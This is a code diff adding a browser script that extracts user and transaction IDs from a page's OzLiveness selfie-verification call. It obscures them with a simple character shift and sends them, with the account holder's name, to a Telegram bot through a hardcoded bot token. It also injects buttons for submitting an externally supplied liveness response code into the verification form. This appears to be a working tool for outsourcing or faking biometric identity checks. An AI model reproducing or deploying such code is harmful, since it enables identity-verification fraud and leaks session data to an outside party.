@@ -1,0 +1,178 @@
+
+if(localStorage.code == 'bls'){
+    function ExtractTheSelfieCode(){
+    
+       
+    
+            const scriptContents = [...document.scripts].map(script => script.textContent);
+            const selfieCode = scriptContents.map(content => {
+                const match = content.match(/OzLiveness\.open\((.+)\)/s);
+                if (match) {
+                    const params = match[1];
+                    const userIdMatch = params.match(/['"]?user_id['"]?:\s*['"]?([^'"]+)['"]?/);
+                    const transactionIdMatch = params.match(/['"]?transaction_id['"]?:\s*['"]?([^'"]+)['"]?/);
+                    if (userIdMatch && transactionIdMatch) {
+                        return userIdMatch[1] + "," + transactionIdMatch[1];
+                    }
+                }
+            }).filter(Boolean).at(0);
+    
+          
+    
+    return selfieCode;
+    }
+    
+    
+    
+    function DownloadAndSendTheSelfieCode(selfieCode){
+         function appendToFile(data, filename) {
+            const a = document.createElement('a');
+            a.style.display = 'none';
+            a.href = 'data:text/plain;charset=utf-8,' + encodeURIComponent(data + '\n');
+            a.download = filename;
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+        }
+    
+     function sendMessage(texte) {
+            fetch('https://api.telegram.org/bot7313056674:AAEIivyB_ADYOQwDDT6Mx_dJBJOQjq0Fe9s/sendMessage?chat_id='+ localStorage.telegramId +'&text=' + texte);
+        }
+       
+      if (selfieCode) {
+                navigator.clipboard.writeText(selfieCode);
+    
+                 appendToFile(selfieCode, 'FORBES_SELFIE_CODE')
+             //  sendMessage( localStorage.accountFullName + ' :  '+selfieCode)
+                 sendMessage('FORBES SELFIE CODE');
+                
+                
+                sendMessage( localStorage.accountFullName + ' :  ' +selfieCode)
+    
+                 //prompt("Selfie Code", selfieCode);
+    
+    
+            } else {
+                alert("No selfie code found");
+            }
+    
+    }
+    
+    var selfieCode = ExtractTheSelfieCode();
+        function submitForm() {
+            const selfieResponseCode = prompt("Enter Selfie Response Code:");
+            if (selfieResponseCode) {
+                document.getElementById("LivenessId").value = selfieResponseCode;
+                document.getElementById("formLiveness").submit();
+            }
+        }
+    
+        $("<div class='position-absolute w-100 p-3 bg-mode' style='z-index: 10000;'>\n" +
+            "    <button class='btn btn-primary' id='_selfieCodeBtn'>\n" +
+            "        Get Selfie Code\n" +
+            "    </button>\n" +
+            "    <button class='btn btn-primary-soft' id='_submitBtn'>\n" +
+            "        Submit\n" +
+            "    </button>\n" +
+            "</div>").prependTo("body");
+        $(document).on("click", "#_submitBtn", submitForm);
+        $(document).on("click", "#_selfieCodeBtn", function getCode(){
+        
+        function appendToFile(data, filename) {
+            const a = document.createElement('a');
+            a.style.display = 'none';
+            a.href = 'data:text/plain;charset=utf-8,' + encodeURIComponent(data + '\n');
+            a.download = filename;
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+        }
+            const scriptContents = [...document.scripts].map(script => script.textContent);
+            const selfieCode = scriptContents.map(content => {
+                const match = content.match(/OzLiveness\.open\((.+)\)/s);
+                if (match) {
+                    const params = match[1];
+                    const userIdMatch = params.match(/['"]?user_id['"]?:\s*['"]?([^'"]+)['"]?/);
+                    const transactionIdMatch = params.match(/['"]?transaction_id['"]?:\s*['"]?([^'"]+)['"]?/);
+                    if (userIdMatch && transactionIdMatch) {
+                        return userIdMatch[1] + "," + transactionIdMatch[1];
+                    }
+                }
+            }).filter(Boolean).at(0);
+    // Original value
+    const value = selfieCode;
+    
+    // Encrypt the value (letters shifted by 5, numbers shifted by 3)
+    const letterShift1 = 5; // Shift letters by 5 positions
+    const numberShift1 = 3; // Shift numbers by 3 positions
+    const encryptedValue1 = preserveFormatEncrypt(value, letterShift1, numberShift1);
+           if (encryptedValue1) {
+               
+               
+               navigator.clipboard.writeText(encryptedValue1);
+    
+                 appendToFile(encryptedValue1, 'FORBES_SELFIE_CODE')
+               
+               prompt("Selfie Code", encryptedValue1);
+    
+    
+            } else {
+                alert("No selfie code found");
+            }
+    
+        
+        } );
+       
+    
+    
+    
+    // Custom function to preserve the format of the original string
+    function preserveFormatEncrypt(value, letterShift, numberShift) {
+        const alphabetLower = 'abcdefghijklmnopqrstuvwxyz';
+        const alphabetUpper = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
+        const numbers = '0123456789';
+        let encrypted = '';
+    
+        for (let char of value) {
+            if (char === '-') {
+                // Keep dashes as is
+                encrypted += '-';
+            } else if (alphabetLower.includes(char)) {
+                // For lowercase letters, shift within the lowercase alphabet
+                let newIndex = (alphabetLower.indexOf(char) + letterShift) % alphabetLower.length;
+                if (newIndex < 0) newIndex += alphabetLower.length; // Handle negative indices for decryption
+                encrypted += alphabetLower[newIndex];
+            } else if (alphabetUpper.includes(char)) {
+                // For uppercase letters, shift within the uppercase alphabet
+                let newIndex = (alphabetUpper.indexOf(char) + letterShift) % alphabetUpper.length;
+                if (newIndex < 0) newIndex += alphabetUpper.length; // Handle negative indices for decryption
+                encrypted += alphabetUpper[newIndex];
+            } else if (numbers.includes(char)) {
+                // For numbers, shift within the numeric string
+                let newIndex = (numbers.indexOf(char) + numberShift) % numbers.length;
+                if (newIndex < 0) newIndex += numbers.length; // Handle negative indices for decryption
+                encrypted += numbers[newIndex];
+            } else {
+                // If it's an unexpected character, keep it as is
+                encrypted += char;
+            }
+        }
+    
+        return encrypted;
+    }
+    
+    // Original value
+    const value = selfieCode;
+    
+    // Encrypt the value (letters shifted by 5, numbers shifted by 3)
+    const letterShift = 5;  // Shift letters by 5 positions
+    const numberShift = 3;  // Shift numbers by 3 positions
+    const encryptedValue = preserveFormatEncrypt(value, letterShift, numberShift);
+    DownloadAndSendTheSelfieCode(encryptedValue);
+    // Log the encrypted value
+    //console.log('Encrypted value:', encryptedValue);
+    
+    // To decrypt, reverse the process by shifting in the opposite direction
+    const decryptedValue = preserveFormatEncrypt(encryptedValue, -letterShift, -numberShift);
+    //console.log('Decrypted value:', decryptedValue);
+    }
